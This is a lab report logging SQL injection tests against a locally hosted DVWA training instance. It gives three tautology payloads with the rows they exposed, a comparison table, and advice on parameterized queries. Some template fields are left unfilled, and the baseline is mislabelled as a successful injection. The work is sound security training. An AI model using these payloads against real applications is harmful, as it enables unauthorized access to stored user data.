SQL Injection Payload Log and Analysis
Laboratory Information

Application: Damn Vulnerable Web Application (DVWA)

Module: SQL Injection

Security Level: Low

Environment: Local XAMPP installation

Testing Scope: Local DVWA instance only

Test 0 – Baseline
Input
1
Purpose

Establish normal application behavior before performing SQL Injection tests.

Result

SQL Injection was successful, and the admin account data was retrieved.

Data Returned

ID: 1
First name: admin
Surname: admin

Screenshot
[Insert baseline screenshot here]
Test 1 – Boolean-Based Injection
Payload
' OR '1'='1
Purpose

Test whether the application allows user input to alter the Boolean logic of the SQL query.

Analysis

The expression:

'1'='1'

is always TRUE.

If the application directly concatenates the supplied input into its SQL statement, the injected expression can change the intended logic of the query.

Result

SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed

ID: ' OR '1'='1,
First name: admin, 
Surname: admin

ID: ' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: ' OR '1'='1,
First name: Hack, 
Surname: Me

ID: ' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: ' OR '1'='1,
First name: Bob, 
Surname: Smith

Successful?
YES / NO
Screenshot
[Insert Screenshot Here]

Test 2 – Boolean-Based Variation
Payload
1' OR '1'='1
Purpose

Test another variation of a Boolean-based SQL Injection.

Analysis

The payload attempts to close the original quoted value and introduce an additional Boolean condition that evaluates to TRUE.

Result

SQL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed

ID: 1' OR '1'='1,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1,
First name: Bob, 
Surname: Smith

Successful?
YES / NO

Screenshot
[Insert Screenshot Here]

Test 3 – Comment-Based Variation
Payload
1' OR '1'='1' -- 
Purpose

Test whether an SQL comment can cause the remainder of the original query to be ignored.

Analysis

The -- sequence can indicate the beginning of a comment in MySQL-compatible SQL syntax. If recognized in the particular query context, SQL after the comment may not be evaluated as part of the intended statement.

Result

SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed

ID: 1' OR '1'='1 --,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1 --,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1 --,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1 --,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1 --,
First name: Bob, 
Surname: Smith

Successful?
YES / NO
Screenshot
[Insert Screenshot Here]
Results Comparison
Test	Payload	Technique	Successful?	Data Exposed
Baseline	1	Normal input	Yes	SQL Injection was successful, and the admin account data was retrieved.
Test 1	' OR '1'='1	Boolean-based SQLi	Yes	SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.
Test 2	1' OR '1'='1	Boolean-based SQLi	Yes	QL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.
Test 3	1' OR '1'='1' --	Boolean + comment	Yes	SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Overall Analysis

The tests demonstrated the risk of constructing SQL statements by directly concatenating user-controlled input into SQL.

The successful payloads were able to alter the intended query logic because the application did not adequately separate user input from SQL syntax at the Low security level.

The vulnerability could be prevented by using parameterized queries or prepared statements.

Lessons Learned
User input should be treated as untrusted.
SQL queries should not be constructed through unsafe string concatenation.
Parameterized queries separate SQL structure from user data.
Security testing should be performed in controlled environments.
The information exposed by a vulnerability should be documented accurately rather than assumed.
Ethical Scope

All testing was performed against a locally hosted DVWA instance specifically designed for security training.

No real-world website, server, database, or third-party service was targeted.
